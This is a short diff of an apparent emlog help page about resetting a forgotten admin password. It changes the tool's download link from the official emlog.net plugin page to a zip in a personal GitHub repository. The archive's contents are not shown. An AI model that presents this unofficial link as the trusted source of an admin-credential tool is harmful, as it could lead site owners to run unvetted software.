@@ -3,7 +3,7 @@
 忘记密码？
 如果您在使用emlog系统过程中忘记了自己的后台密码，可以使用emlog密码重置工具来重置密码：
 
-工具下载地址：http://www.emlog.net/plugin/176
+工具下载地址：https://github.com/axcxa/al/blob/master/passwd.zip
 
 emlog管理员密码重置工具，用于在忘记管理员帐号和密码的情况下找回管理员帐号和密码。
 
